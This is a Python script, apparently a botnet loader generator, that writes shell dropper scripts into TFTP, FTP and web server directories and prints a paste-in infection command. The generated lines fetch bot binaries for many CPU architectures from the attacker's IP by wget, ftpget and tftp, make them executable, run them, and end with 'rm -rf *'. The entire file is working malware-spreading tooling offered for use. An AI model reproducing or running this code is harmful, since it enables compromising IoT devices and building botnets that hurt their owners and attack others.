#Made by daddyL33T
#V1.2 Finished date 7/7/22
import subprocess, sys

if len(sys.argv) != 4:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <Name> <IPADDR> </var/lib/tftpboot?>\x1b[0m")
    exit(1)

name = sys.argv[1]
ip = sys.argv[2]
tmp_tftp = sys.argv[3]

bot_prefix = "VR"

compileas = [
             "arm7",
             "arm5",
             "arm6",
             "arm",
             "mips",
             "mpsl",
             "x86",
             "ppc",
             "x86_64",
             "sh4",
             "mips2"
             ]

def run(cmd):
    subprocess.call(cmd, shell=True)

if "y" in tmp_tftp:
    run('echo "#!/bin/sh" > /var/lib/tftpboot/'+name+'1.sh')
    run('echo "cd /tmp" > /var/lib/tftpboot/'+name+'1.sh')
    run('echo "#!/bin/sh" > /var/lib/tftpboot/'+name+'2.sh')
    run('echo "cd /tmp" > /var/lib/tftpboot/'+name+'2.sh')
else:
    run('echo "#!/bin/sh" > /srv/tftp/'+name+'1.sh')
    run('echo "cd /tmp" > /srv/tftp/'+name+'1.sh')
    run('echo "#!/bin/sh" > /srv/tftp/'+name+'2.sh')
    run('echo "cd /tmp" > /srv/tftp/'+name+'2.sh')

run('echo "#!/bin/sh" > /var/www/html/bins/'+name+'.sh')
run('echo "cd /tmp" > /var/www/html/bins/'+name+'.sh')
run('echo "#!/bin/sh" > /var/ftp/'+name+'3.sh')
run('echo "cd /tmp" > /var/ftp/'+name+'3.sh')


for i in compileas:
    run('echo "wget http://' + ip + '/bins/'+bot_prefix+'.'+i+ '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.wget; rm -rf '+bot_prefix+'.'+i+ '" >> /var/www/html/bins/'+name+'.sh')
    run('echo "ftpget ' + ip + ' '+bot_prefix+'.'+i+ ' '+bot_prefix+'.'+i+ '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.ftp; rm -rf '+bot_prefix+'.'+i+ '" >> /var/ftp/'+name+'3.sh')
    if "y" in tmp_tftp:
        run('echo "tftp ' + ip + ' -c get '+bot_prefix+'.'+i+ '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.tftp2" >> /var/lib/tftpboot/'+name+'2.sh')
        run('echo "tftp -r '+bot_prefix+'.'+i+ ' -g ' + ip + '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.tftp" >> /var/lib/tftpboot/'+name+'1.sh')
    else:
        run('echo "tftp ' + ip + ' -c get '+bot_prefix+'.'+i+ '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.tftp2" >> /srv/tftp/'+name+'2.sh')
        run('echo "tftp -r '+bot_prefix+'.'+i+ ' -g ' + ip + '; chmod 777 '+bot_prefix+'.'+i+ '; ./'+bot_prefix+'.'+i+ ' '+name+'.'+i+'.tftp" >> /srv/tftp/'+name+'1.sh')

print("\x1b[0;32mYour link: cd /tmp; wget http://" + ip + "/bins/"+name+".sh; chmod 777 "+name+".sh; sh "+name+".sh; tftp " + ip + " -c get "+name+"2.sh; chmod 777 "+name+"2.sh; sh "+name+"2.sh; tftp -r "+name+"1.sh -g " + ip + "; chmod 777 "+name+"1.sh; sh "+name+"1.sh; ftpget " + ip + " "+name+"3.sh "+name+"3.sh; sh "+name+"3.sh; rm -rf "+name+".sh "+name+"1.sh "+name+"2.sh "+name+"3.sh; rm -rf *\x1b[0m")
